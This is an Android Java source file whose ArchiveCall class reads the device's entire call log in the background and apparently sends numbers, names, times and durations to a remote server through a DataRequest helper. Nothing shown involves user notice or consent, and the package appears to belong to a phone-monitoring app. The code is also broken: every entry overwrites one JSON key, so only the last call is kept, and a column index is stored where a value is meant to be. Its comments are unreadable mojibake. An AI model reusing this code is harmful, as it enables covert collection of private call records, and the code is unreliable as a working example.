package com.inet.android.archive;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;
import android.util.Log;

import com.inet.android.convertdate.ConvertDate;
import com.inet.android.db.RequestDataBaseHelper;
import com.inet.android.request.DataRequest;

public class ArchiveCall extends AsyncTask<Context, Void, Void> {
	Context mContext;
	RequestDataBaseHelper db;
	private int iType = 0;
	ConvertDate date;

	private String getDuration(long milliseconds) {
		int seconds = (int) (milliseconds / 1000) % 60; // 280
		int minutes = (int) ((milliseconds / (1000 * 60)) % 60);
		int hours = (int) ((milliseconds / (1000 * 60 * 60)) % 24);
		if (hours < 1)
			return minutes + ":" + seconds;
		return hours + ":" + minutes + ":" + seconds;
	}

	private String readCallLogs() {

		// ��������� ��������
		Log.d("Insert: ", "Inserting ..");
		// ��������� JSONobj
		JSONObject AllCallJson = new JSONObject();
		date = new ConvertDate();

		// ������ ������ � �������-����������
		// � �������� ��� ������ �� �������
		Cursor callLogCursor = mContext.getContentResolver().query(
				android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
				android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

		if (callLogCursor != null) {
			// �������� � �����, ���� �� ����� �� ��������� ������
			Log.d("Insert: ", "callogCursor != 0 ..");

			while (callLogCursor.moveToNext()) {
				Log.d("Insert: ", "callogCursor moveToNext ..");

				// �������������. � ����� ������� �� �����
				// String id = callLogCursor.getString(callLogCursor
				// .getColumnIndex(CallLog.Calls._ID));
				// ��� ��������
				String name = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.CACHED_NAME));

				String cacheNumber = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
				// ����� �������� � �.�.
				String number = callLogCursor.getString(callLogCursor
						.getColumnIndex(CallLog.Calls.NUMBER));
				long dateTimeMillis = callLogCursor.getLong(callLogCursor
						.getColumnIndex(CallLog.Calls.DATE));
				long durationMillis = callLogCursor.getLong(callLogCursor
						.getColumnIndex(CallLog.Calls.DURATION));
				int callType = callLogCursor.getInt(callLogCursor
						.getColumnIndex(CallLog.Calls.TYPE));
				int isNew = callLogCursor.getColumnIndex(CallLog.Calls.NEW);

				String duration = getDuration(durationMillis * 1000);

				String dateString = date.getData(dateTimeMillis);

				if (cacheNumber == null)
					cacheNumber = number;
				if (name == null)
					name = "No Name";

				if (callType == CallLog.Calls.OUTGOING_TYPE) {
					iType = 3;
				} else if (callType == CallLog.Calls.INCOMING_TYPE) {
					iType = 2;
				} else if (callType == CallLog.Calls.MISSED_TYPE) {
					iType = 1;
				}
				// Log.d("CallLog", number + " " + name + " " + cacheNumber +
				// " "
				// + dateString + " " + duration + " " + callType + " "
				// + isNew);
				try {
					JSONObject archiveCallJson = new JSONObject();
					JSONObject infoCallJson = new JSONObject();

					archiveCallJson.put("time", dateString);
					archiveCallJson.put("type", iType);
					infoCallJson.put("tel", number);
					infoCallJson.put("duration", duration);
					archiveCallJson.put("info", infoCallJson);
					AllCallJson.put("data", archiveCallJson);
				} catch (JSONException e) {
					// TODO ������������� ��������� ���� catch
					e.printStackTrace();
				}
			}
			callLogCursor.close();

			if (AllCallJson != null) {
				DataRequest dr = new DataRequest(mContext);
				dr.sendRequest(AllCallJson.toString());
				Log.d("JsonCall", AllCallJson.toString());
			}
		}
		return null;
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO ������������� ��������� �������� ������
		Log.d("doInBack", "doIn");
		this.mContext = params[0];
		Log.d("doInBack", mContext.toString());
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
